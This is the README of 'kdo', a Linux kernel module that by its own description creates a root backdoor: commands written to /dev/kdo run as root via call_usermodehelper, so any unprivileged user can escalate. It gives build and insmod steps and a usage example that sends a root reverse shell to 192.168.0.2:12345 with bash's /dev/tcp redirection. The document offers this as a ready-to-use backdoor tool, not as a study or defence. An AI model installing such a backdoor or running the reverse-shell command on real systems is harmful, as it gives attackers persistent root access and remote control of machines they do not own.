kdo
===
Kernel-level sudo. This is a very simple LKM that creates a character device at `/dev/kdo` to which
commands can be written and executed via `call_usermodehelper`, effectively creating a backdoor for
unprivileged users to execute commands as root.


Installation
------------
**1**. Clone the repository
```bash
git clone https://github.com/hiatus/kdo
```

**2**. Build the module
```bash
cd kdo
make
```

**3**. Insert the module 
```
sudo insmod kdo.ko
```


Command Execution
-----------------
Simply write the command arguments to `/dev/kdo`. Because the module actually treats this internally
as an argument to `/bin/sh -i -c`, redirection and other functionalities are also supported. For
example, to send a root reverse shell to `192.168.0.2:12345`, run:

```bash
echo 'bash -i &> /dev/tcp/192.168.0.2/12345 0>&1' > /dev/kdo
```
